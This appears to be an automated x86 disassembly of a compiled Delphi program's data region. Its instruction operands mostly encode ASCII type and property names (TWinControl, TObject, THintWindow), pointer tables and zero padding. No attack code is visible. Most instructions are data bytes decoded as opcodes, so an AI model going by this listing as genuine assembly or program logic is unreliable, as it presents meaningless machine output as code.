je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x6c ] si
adc [ eax ] eax
enter 0x4449 0x0
adc [ ebx + 0x44 ] 0x0
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x445594c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x59200040 ] dl
inc esp
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x59200040 ] dl
inc esp
add al bh
pushad
inc esp
add [ eax ] al
adc [ eax ] al
xor al 0x53
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
xchg esp eax
push ebp
inc esp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
or al 0x55
inc esp
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x57 ] dl
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
xchg esp eax
adc [ eax ] eax
push esp
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x44550cc0 ] cl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add ah cl
mov bl 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ edi + eax ] dh
jo r-xdata
add [ esi + ecx * 4 + 0x7340041 ] bl
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x56ac0040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x7c600040 ] dl
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10540040 ] dl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jl r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
push edi
inc esp
add [ ecx + ebx * 2 ] ah
inc esp
add [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
push esi
jbe r-xdata
add [ esi ] dl
pop ecx
inc esp
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x7c600040 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or [ esi + 0x44 ] dl
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc esp
add [ eax ] cl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ eax - 0x53ffbb6f ] dl
rol [ eax + eax - 0x5c ] 0xb4
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0xbffbb6c ] cl
xchg ebx eax
inc esp
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0x3c004490 ] bh
scasd [ edi ]
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_445868
inc esp
add [ esi + edi * 4 - 0x3d87ffbc ] cl
inc esp
add [ eax - 0x5a ] cl
inc esp
add ah dl
fwait
inc esp
add ah dh
mov ah 0x44
add [ eax + esi * 4 + 0x44 ] ah
add [ eax - 0x4b ] ah
inc esp
add [ edx + ebp * 4 + 0x44 ] dh
add [ eax + 0x580044a8 ] bh
les eax [ eax + eax - 0x34 ]
test al 0x44
add al cl
cwde
inc esp
add al bh
test al 0x44
add [ eax ] bl
test eax 0xa9dc0044
inc esp
add [ eax ] ch
stosb [ edi ]
inc esp
add [ edi ] ah
inc esp
add [ edi ] dh
inc esp
add [ edi - 0x5863ffbc ] bh
inc esp
add [ eax - 0x4bffbb55 ] ah
stosd [ edi ]
inc esp
add [ edi + edi * 4 - 0x3e6bffbc ] ch
inc esp
add [ edx + edx * 4 + 0x44 ] cl
add al bh
mov dh 0x44
add [ eax + 0x380044b5 ] al
mov eax 0xb8e00044
inc esp
add al ch
cmpsd [ esi ] [ edi ]
inc esp
add [ edx + edx * 4 - 0x6c3bffbc ] al
inc esp
add ah dl
xchg ebx eax
inc esp
add [ edx + edx * 4 + 0x44 ] bl
add [ eax + 0x340044a2 ] ch
mov dl 0x44
add [ edi + edx * 4 - 0x588fffbc ] bh
inc esp
add al bh
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x6e ] bl
inc esp
add [ eax - 0x6e ] dl
inc esp
add [ esp - 0x59ebffbc ] bl
inc esp
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
insb
nop
and al 0x59
inc esp
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
jmp [ eax ]
jae r-xdata
je r-xdata
outsd
insb
lodsb [ esi ]
push esi
inc esp
add [ eax + 0xb00418f ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add bh bh
and [ ecx - 0x3febffbc ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jb r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
dec esp
add [ eax ] al
[ eax + 0x1004497 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x44463874
push esp
adc [ eax ] al
add [ eax ] bh
add bh bh
les esp [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x44463874
outsd
insb
jae r-xdata
xor al 0x40
outsd
outsb
je r-xdata
add [ eax ] al
inc [ eax - 0xb010000 ]
mov edi 0x44
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
adc [ eax ] eax
add [ eax ] 0x0
or [ edx ] al
sbb al 0x8f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
sub [ edi + 0x10044 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x4c
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add bh bh
add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add [ eax + ecx + 0x42 ] ch
add al al
or [ edx ] al
or [ esi + 0x66040044 ] cl
inc ebp
add [ esi + ecx * 4 + 0x44 ] bh
js r-xdata
add [ eax + eax ] ah
add [ eax ] al
xor [ ebx + 0x44 ] cl
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
and [ eax ] cl
inc edx
add [ eax + 0x540044c4 ] bl
add al 0x11
inc eax
add [ ecx + eax ] dl
push [ ecx + ebx * 4 ]
inc esp
add [ eax + eax * 8 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
add [ 0x65480600 ] 0x69
push 0x44463874
adc [ eax ] al
inc esp
add [ eax ] al
dec [ edi + edx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
jl r-xdata
mov esp 0x445a
add [ eax ] bh
pop ebx
inc esp
jns r-xdata
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
push [ edi + edx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
pop esp
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ esp + ebx * 2 + 0x44 ] dl
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
pop esp
inc esp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x44 ] bl
add [ esi ] ch
inc ebp
add [ esp + eax * 8 - 0x700bffbc ] bh
inc esp
add [ eax + 0x7c00448e ] dh
inc bp
add [ eax - 0x17ffba9a ] dl
mov es [ eax + eax - 0x48 ]
inc bp
add [ edi + ecx * 4 + 0x44 ] al
add al al
inc bp
add [ edi + ecx * 4 + 0x44 ] ah
add al cl
inc bp
add ah al
les eax [ eax + eax + 0x58 ]
nop
inc esp
add [ eax - 0x7bffbb70 ] bl
pop [ eax + eax - 0x24 ]
inc bp
add al ah
inc bp
add [ eax + 0x1800448f ] ch
lea eax [ eax + eax + 0x15 ]
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5b54c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x5b ] dl
inc esp
inc esp
inc esp
add [ eax - 0x37ffbdf8 ] cl
inc esp
add [ eax + ecx + 0x42 ] dl
add [ edi + ecx * 4 ] bl
outsd
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600445c ] dh
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] ah
or [ edx ] al
cwde
les eax [ eax + eax + 0x54 ]
inc eax
js r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop [ eax + eax - 0x28 ]
pop es
inc edx
mov [ eax ] cl
inc edx
add al cl
inc ecx
add [ eax + 0x1 ] bl
jb r-xdata
pop esp
inc esp
pop esi
outsd
insb
jae r-xdata
mov eax eax
clc
pop esp
outsb
je r-xdata
inc ebx
outsd
pop esp
inc esp
push esp
add [ ebx + 0x445cb4c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ esp + ebx * 2 + 0x44 ] edx
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
sar al 0x5c
0x4004460 0x2
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
shl ah 0x5b
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0x2c ]
salc
inc esp
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
pop ebp
inc esp
add [ ecx + eax ] bh
add al ah
pop ebx
inc esp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
push esp
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
hlt
or cl [ eax ]
push esp
dec ecx
insd
pop eax
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah cl
les eax [ eax + eax + 0x4 ]
push cs
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
outsd
insb
jae r-xdata
inc esp
add dl ch
pushad
inc esp
add [ edx + eax ] al
add [ eax ] al
pushad
push esi
inc esp
add [ edi + eax ] dh
add [ eax ] al
add [ eax ] al
pop eax
pop esi
inc esp
add ah bh
pushad
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x5e ] dh
add bh bh
call [ eax + 0x445d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5e ] bl
sub_445f5a
inc esp
jmp r-xdata
add [ eax - 0x2bffbb07 ] ah
stc
inc esp
add ah dh
stc
inc esp
add [ eax + 0x28004515 ] ah
cli
inc esp
add [ edx + edi * 8 + 0x44 ] al
add [ eax ] dh
push ss
inc ebp
add al al
cli
inc esp
add ah ah
cli
inc esp
add al dh
0xeb040044 0x44
sub_445f71
add [ esp + ebp * 8 + 0x44 ] bh
add [ ebp * 8 - 0x1273ffbc ] bh
inc esp
add al al
in eax dx
inc esp
add ah dl
in eax dx
inc esp
add [ esi + esi * 8 + 0x44 ] bl
add [ eax + 0x440044f6 ] cl
test [ eax + eax + 0x64 ] 0x80044f7
clc
inc esp
add al bl
clc
inc esp
add [ eax - 0x5fffbb07 ] al
stc
inc esp
add ah dl
stc
inc esp
add ah dh
stc
inc esp
add [ eax + 0x28004515 ] ah
cli
inc esp
add [ edx + edi * 8 + 0x44 ] al
add [ eax ] dh
push ss
inc ebp
add al al
cli
inc esp
add ah ah
cli
inc esp
add al dh
0xeb040044 0x44
sub_445fce
adc al 0xeb
inc esp
add ah dl
out dx al
inc esp
add al ch
out dx al
inc esp
add ah bh
out dx al
inc esp
add [ eax ] dl
out dx eax
inc esp
add al bl
sbb [ ebp ] al
hlt
sub_446808
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
push 0x280044
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4468f8
fsubr [ eax + 0x44 ]
add dl ah
push 0x68ec0044
inc esp
add [ ebp + 0x68 ] bl
inc esp
add [ ebp + 0x68 ] ah
inc esp
add [ ebp + 0x68 ] ch
inc esp
add [ ebp + 0x68 ] dh
inc esp
add [ edx - 0x70ffbb98 ] al
push 0x689c0044
inc esp
add [ ecx - 0x49ffbb98 ] ch
push 0x68c30044
inc esp
add al dl
push 0x10044
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x68f8e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x69300044 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
imul eax [ eax + eax + 0x78 ] 0x64000000
adc al [ eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add ah bh
sub eax 0x2e500045
inc ebp
add al cl
das
inc ebp
add al bl
das
inc ebp
add [ eax - 0x7fffbac9 ] bl
cmp al [ ebp ]
sar [ eax * 2 + 0x453ec400 ] 0x0
enter 0x4543 0x0
jl r-xdata
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
mov al 0x50
inc ebp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
inc ebp
add [ esp + ebp + 0x3b5c0045 ] dl
inc ebp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add al 0x42
nop
je r-xdata
add [ eax ] al
jl r-xdata
mov eax eax
and [ edx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push 0x44
add [ eax ] ch
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
mov [ eax ] al
inc edx
add [ eax + 0x18004034 ] dh
je r-xdata
add [ edi + eax + 0x42 ] dl
add ah cl
les eax [ eax + eax + 0x4 ]
xor al 0x4
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x44 ] bh
push cs
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax ] cl
add al [ eax ]
add [ ebp + ebx * 2 + 0x44 ] al
add [ edi + eax ] dh
inc esp
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
jecxz r-xdata
inc eax
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0x2c ]
salc
inc esp
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
